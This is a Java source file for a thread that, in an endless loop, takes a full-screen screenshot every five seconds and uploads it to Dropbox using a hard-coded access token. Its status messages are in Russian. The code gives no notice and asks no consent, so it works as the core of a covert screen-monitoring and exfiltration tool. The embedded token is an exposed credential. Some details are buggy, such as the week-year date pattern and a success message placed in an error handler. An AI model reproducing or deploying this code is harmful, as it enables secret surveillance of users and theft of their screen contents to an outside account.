import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread
{
    public void run()
    {
        for(int i = 0;; i++)
        {
            String accessToken = "dSDM0A3vuXAAAAAAAAAAIWJAyPTLAPBau_WVYs0sn6Zk-yYpPR_MlmJTN1fDBYCh";
            DbxRequestConfig config = DbxRequestConfig.newBuilder( "dropbox/java-tutorial" ).build();
            DbxClientV2 client = new DbxClientV2( config, accessToken );
            DateFormat dateFormat = new SimpleDateFormat( "YYYYMMdd_HH:mm:ss" );
            String NameFileDate = dateFormat.format( new Date() );
            System.out.println( "Готово " + NameFileDate );

            BufferedImage image = null;
            try
            {
                image = new Robot().createScreenCapture( new Rectangle( Toolkit.getDefaultToolkit().getScreenSize() ) );
                System.out.println("Скриншот готов");
                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                ImageIO.write( image, "png", outputStream );
                InputStream sreen = new ByteArrayInputStream( outputStream.toByteArray() );
                System.out.println("Конвертация готова");
                InputStream in = sreen;
                FileMetadata metadata = client.files().uploadBuilder( "/" + NameFileDate + ".png" )
                        .uploadAndFinish(in);
            }
            catch (DbxException e)
            {
                e.printStackTrace();
            }
            catch (IOException e)
            {
                e.printStackTrace();
            }
            catch (AWTException e)
            {
                e.printStackTrace();
            }
            try
            {
                sleep( 5000 );
            }
            catch (InterruptedException e)
            {
                e.printStackTrace();
                System.out.println("Файл отправлен успешно");
            }
        }
    }
}


